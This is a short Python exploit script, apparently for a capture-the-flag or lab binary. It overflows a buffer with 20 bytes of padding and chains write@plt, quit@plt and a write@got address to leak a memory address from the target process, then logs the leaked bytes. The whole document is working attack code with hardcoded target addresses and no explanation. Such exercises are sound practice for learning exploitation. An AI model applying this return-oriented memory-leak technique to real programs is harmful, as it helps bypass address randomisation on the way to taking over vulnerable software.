from helper import *
from time import sleep

write_plt = hex2le("08048290")
write_got = hex2le("08049434")

quit_plt = hex2le("080482b0")

welcome = "Bye!\n\n"

def main():
    log(read_all(sys.stdin))

    exploit = 20 * "B" + \
              write_plt + \
              quit_plt + \
              write_got

    write_bytes(int2le(len(exploit)))
    write_bytes(exploit)
    response = read_all(sys.stdin)
    if not response.startswith(welcome):
        log("Something wrong...")
    log(le2hex(response[len(welcome):len(welcome)+4]))

if __name__ == "__main__":
    main()

